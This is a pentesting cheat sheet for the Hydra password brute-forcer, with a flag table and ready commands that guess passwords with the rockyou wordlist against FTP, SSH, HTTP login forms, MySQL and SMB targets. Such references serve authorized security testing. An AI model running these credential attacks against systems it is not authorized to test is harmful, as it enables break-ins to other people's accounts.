---
type: tool
category: brute-force
tags: [brute-force, password-cracking, hydra, credential-attack]
source: teamghsoftware/security-cheatsheets
---

## What it is
Hydra is a fast, parallelized online password brute-forcer. Supports FTP, SSH, HTTP, SMB, MySQL, and many other protocols.

## Syntax

```bash
hydra [options] <target> <protocol>
```

## Core flags

| Flag | Meaning |
|------|---------|
| `-l <user>` | Single username |
| `-L <file>` | Username wordlist |
| `-p <pass>` | Single password |
| `-P <file>` | Password wordlist |
| `-t <n>` | Number of parallel tasks (default 16) |
| `-vV` | Very verbose — show each attempt |
| `-e s` | Try login as password (same) |
| `-e n` | Try empty password |
| `-o <file>` | Save found credentials to file |
| `-s <port>` | Non-default port |
| `-f` | Stop after first valid pair found |

## Common examples

```bash
# FTP brute force
hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV <IP> ftp

# SSH brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt <IP> ssh

# HTTP POST login form
hydra -l admin -P rockyou.txt <IP> http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"

# HTTP Basic auth
hydra -l admin -P rockyou.txt <IP> http-get /protected/

# MySQL
hydra -l root -P rockyou.txt <IP> mysql

# SMB
hydra -l administrator -P rockyou.txt <IP> smb
```

## Wordlists

- `/usr/share/wordlists/rockyou.txt` — standard first choice
- `/opt/SecLists/Passwords/` — curated lists by context

## Related
- [[john]]
- [[Credential Reuse]]
- [[Pentest Web Cheatsheet]]
